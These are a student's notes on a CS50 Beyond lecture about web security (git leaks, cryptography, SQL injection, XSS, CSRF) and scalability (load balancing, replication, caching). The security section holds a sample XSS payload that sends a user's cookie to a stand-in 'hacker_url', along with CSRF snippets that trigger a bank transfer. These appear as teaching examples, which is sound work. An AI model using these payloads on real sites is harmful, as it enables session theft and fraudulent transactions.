---
path: "/cs50/beyond/6"
date: '2019-06-09'
title: "CS50 Beyond lecture 6 - Security & Scalability"
description: CS50 Beyond lecture 6 정리
image: ''
tags: ['CS50', 'CS50 Beyond', 'Security', 'Scalability']
---
> Harvard's CS50 Beyond lecture 6 정리

### Security
making sure that you, your application, and your users are protected by potential security threats and vulnerabilities

#### Git Vulnerabilities
- github repos: anyone can look at the code to take advantage of potential vulnerabilites (bcuz public as default)
    - ex. git commit history: credentials can be exposed
- solutions: 
    - change the credentials
    - git purge (overwrite history)

#### HTML Vulnerabilities
- phishing links: url leads to somewhere different from specified content

#### HTTPS and Cryptography
- securely deliver data from one location to another location
- use __Cryptography__
    - __Secret-key Cryptography__: use a singly key to encrypt and decrypt messages (key & ciphertext is transferred)
        - problem: key is also sent through the internet
    - __Public-key Cryptography__: use public key to encrypt and private key to decrypt message 
        - receiver generates private and public key, shares only the public key to sender, and sender transfers ciphertext which receiver can decrypt using private key

#### Environment Variables
- don't store credentials in repos
- store credentials in environment variables

#### Database Vulnerabilities
database security concerns
- passwords: passwords can be exposed
    - solution: store hashed version of passwords
- data leaks:
    - ex. forgot your password message: indication of which id exists or not
    - ex. response time: can retrieve information based on response time

#### SQL Injection
- database queries that can inject problems to disrupt the SQL database
- solution: use libraries, escape characters

#### JavaScript Vulnerabilities
javascript opens a whole host of potential security vulnerabilites
- __Cross-site Scripting__: injecting javascript to expose private information
```html
<!-- injecting javascript into the request path (url) to reveal cookie of user -->
/<script>document.write('img src="hacker_url?cookie=" + document.cookie + ">"</script>
```
- __Cross-site Request Forgery__: injecting methods to take advantage of requests to expose private information
```html
<!-- automatically fetches src (using request link) leading to transferring money to someone using credentials -->
<img src="http://yourbank.com/transfer?to=brian&amt=2800" />
<!-- another exampler of cross-site request forgery using a form -->
<form action="http://yourbank.com/transfer" method="post">
    <input type="hidden" name="to" value="brian">
    <input type="hidden" name="amt" value="2800">
    <input type="submit" value="click!">
</form>
```
- solution: use a CSRF(Cross-site Request Forgery) token for transfers
    - each form has token and this is validated when sent to server 

### Scalability
what we need to consider for having multiple people using the same application at the same time
- vertical scaling: increase the size of the server
- horizontal scaling: increase the number of servers
    - use load balancing to handle which server the client should be directed to

#### Benchmarking
load testing the application to figure out how many users the server can handle

#### Load Balancing
- __load balancer__: device that handles which server the user should be directed to
- __Load Balancing Methods__: deciding which server to send the user
    - __fewest connections__: send user to the server w/ the fewest users; can spread out users but may be potentially computationally expensive 
    - __random choice__: randomly assign server; quick but may flock to one server
    - __round robin__: go around each server
- __Session-aware Load Balancing__: preserving sessions while using load balancing to serve pages (to solve problems where user is directed to different servers, losing session information)
    - sticky sessions: load balancer remembers the particular server the user was first directed to
    - sessions in database: store sessions in the database
    - client-side session: store the session in the client-side

#### Auto-scaling
automatically grows or shinks amount of servers based upon the load of the application
- cf) use heartbeat to detect which servers are alive or down

#### Scaling Databases
how to scale databases
- __Database Partitioning__: separate tables in some way
- __Database Replication__: having multiple databases
    - __singly-primary replication__: can only write to the primary database while reading can be distributed to any of the databases (when written to primary db, updates other database based on the primary db)
    - __multi-primary replication__: each db is writable and readable, need to update all other databases when one database is changed
- __Caching__: store data in cache to prevent constantly sending requests to database
    - __client-side caching__: adding cache-control in HTTP header in response (from server) to indicate redundant data to be retrieved from cache next time
        - __entity tag__: entity tag to indicate the version of the document to prevent redundant requests for page
```http
Cache-control: max-age=86400
Etag: "74682038474827847837E83393739"
```
    - __server-side caching__: servers accessing cache instead of database for recent information